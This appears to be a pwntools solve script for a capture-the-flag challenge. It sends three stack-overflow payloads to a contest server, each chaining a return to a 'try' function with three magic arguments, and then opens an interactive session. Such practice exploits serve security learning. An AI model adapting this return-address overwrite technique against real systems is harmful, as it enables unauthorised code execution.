#!/usr/bin/env python3

import subprocess
from pwn import *

exe = ELF("./vuln", checksec=False)
libc = ELF("./libvuln.so", checksec=False)
context.binary = exe
context.log_level = 'debug'

# p = process('./vuln')
p = connect('binary.challs.pragyanctf.tech', 6001)

payload = cyclic(52)
payload += flat(exe.sym['tryOne'])
payload += flat(exe.sym['main'])
payload += p32(0xdeadbeef)
payload += p32(0xf00dcafe)
payload += p32(0xd00dface)
p.sendafter(b'All the Best :)', payload)

payload = cyclic(52)
payload += flat(exe.sym['tryTwo'])
payload += flat(exe.sym['main'])
payload += p32(0xf00dcafe)
payload += p32(0xd00dface)
payload += p32(0xdeadbeef)
p.sendafter(b'All the Best :)', payload)

payload = cyclic(52)
payload += flat(exe.sym['tryThree'])
payload += flat(exe.sym['main'])
payload += p32(0xd00dface)
payload += p32(0xdeadbeef)
payload += p32(0xf00dcafe)
p.sendafter(b'All the Best :)', payload)
p.interactive()